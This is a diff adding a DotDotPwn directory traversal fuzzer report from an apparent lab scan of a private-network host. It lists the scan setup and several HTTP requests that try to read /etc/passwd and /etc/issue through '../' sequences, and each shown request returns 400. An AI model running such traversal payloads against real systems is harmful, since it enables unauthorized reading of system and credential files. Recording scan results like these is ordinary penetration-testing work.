@@ -1,0 +1,47 @@
+#################################################################################
+#                                                                               #
+#  CubilFelino                                                       Chatsubo   #
+#  Security Research Lab              and            [(in)Security Dark] Labs   #
+#  chr1x.sectester.net                             chatsubo-labs.blogspot.com   #
+#                                                                               #
+#                               pr0udly present:                                #
+#                                                                               #
+#  ________            __  ________            __  __________                   #
+#  \______ \    ____ _/  |_\______ \    ____ _/  |_\______   \__  _  __ ____    #
+#   |    |  \  /  _ \\   __\|    |  \  /  _ \\   __\|     ___/\ \/ \/ //    \   #
+#   |    `   \(  <_> )|  |  |    `   \(  <_> )|  |  |    |     \     /|   |  \  #
+#  /_______  / \____/ |__| /_______  / \____/ |__|  |____|      \/\_/ |___|  /  #
+#          \/                      \/                                      \/   #
+#                              - DotDotPwn v3.0.2 -                             #
+#                         The Directory Traversal Fuzzer                        #
+#                         http://dotdotpwn.sectester.net                        #
+#                            dotdotpwn@sectester.net                            #
+#                                                                               #
+#                               by chr1x & nitr0us                              #
+#################################################################################
+
+[+] Report name: Reports/192.168.159.139_06-29-2018_00-37.txt
+
+[========== TARGET INFORMATION ==========]
+[+] Hostname: 192.168.159.139
+[+] Protocol: http
+[+] Port: 80
+
+[=========== TRAVERSAL ENGINE ===========]
+[+] Creating Traversal patterns (mix of dots and slashes)
+[+] Multiplying 6 times the traversal patterns (-d switch)
+[+] Creating the Special Traversal patterns
+[+] Translating (back)slashes in the filenames
+[+] Adapting the filenames according to the OS type detected (unix)
+[+] Including Special sufixes
+[+] Traversal Engine DONE ! - Total traversal tests created: 11028
+
+[=========== TESTING RESULTS ============]
+[+] Ready to launch 3.33 traversals per second
+[+] Press Enter to start the testing (You can stop it pressing Ctrl + C)
+[*] HTTP Status: 400 | Testing Path: http://192.168.159.139:80/../etc/passwd
+[*] HTTP Status: 400 | Testing Path: http://192.168.159.139:80/../etc/issue
+[*] HTTP Status: 400 | Testing Path: http://192.168.159.139:80/../../etc/passwd
+[*] HTTP Status: 400 | Testing Path: http://192.168.159.139:80/../../etc/issue
+[*] HTTP Status: 400 | Testing Path: http://192.168.159.139:80/../../../etc/passwd
+[*] HTTP Status: 400 | Testing Path: http://192.168.159.139:80/../../../etc/issue
